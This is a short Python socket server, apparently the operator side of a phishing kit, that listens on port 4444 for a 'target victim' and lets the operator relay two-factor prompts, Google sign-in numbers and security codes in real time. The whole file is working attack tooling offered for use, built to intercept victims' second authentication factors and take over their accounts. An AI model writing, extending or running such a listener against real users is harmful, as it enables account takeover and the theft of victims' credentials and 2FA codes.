import socket;
HOST = "127.0.0.1"
PORT = 4444 # Your PORT

server = socket.socket()
server.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
server.bind((HOST,PORT))
server.listen(1)
while True:
    print("[/]Awaiting Client")
    client,addr = server.accept()
    print(f"[+] Connected {addr}")
    while client:
        result = client.recv(1024).decode()
        if(result == "close"):
            print("target victim closed window")
            break
        print(result)
        # if target closed software, server will get exception "broken pipe"
        # so if exception, loop will be broken
        try:
            command = input("Do you need 2 factoring  [Y/n] >")
            if(command.lower() == "y"):
                if(result.startswith("G")):
                    client.send("G code".encode())
                    client.recv(1024)
                    print("eg.3,12,12")
                    command=input("Type Two Authentication Choice Numbers >")
                    client.send(command.encode())
                    number = client.recv(1024).decode()
                    print("Two Factor Authentication Number is "+number)
                else:
                    client.send("F code".encode())
                    code = client.recv(1024).decode()
                    print(f"Security Code : {code}")
                    command = input("are security codes correct ? [Y/n] >")
                    while(command.lower() != "y"):
                        client.send("False".encode())
                        code = client.recv(1024).decode()
                        print(f"Security Code : {code}")
                        command = input("are security codes correct ? [Y/n] >")
                    client.send("True".encode())
            else:
                client.send("okay".encode())
        except:
            print("client closed software")
            break
    command = input("Do you exit [Y/n]>")
    if(command.lower() == "y"):
        server.close()
        break
